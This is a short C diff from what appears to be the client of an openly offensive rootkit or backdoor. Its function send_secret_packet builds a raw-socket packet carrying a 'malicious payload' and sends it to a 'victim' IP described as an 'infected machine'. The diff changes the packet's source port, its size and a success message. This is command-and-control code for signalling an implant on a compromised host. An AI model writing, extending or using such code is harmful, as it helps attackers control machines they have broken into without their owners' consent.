@@ -124,13 +124,13 @@ void send_secret_packet(char* argv){
     char* local_ip = getLocalIpAddress();
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
     check_ip_address_format(argv);
-    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, SECRET_PACKET_PAYLOAD);
+    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, SECRET_PACKET_PAYLOAD);
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious payload
     if(rawsocket_send(packet)<0){
         printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
     }else{
-        printf("["KGRN"OK"RESET"]""Request to unhide successfully sent!\n");
+        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
     }
     free(local_ip);
 }
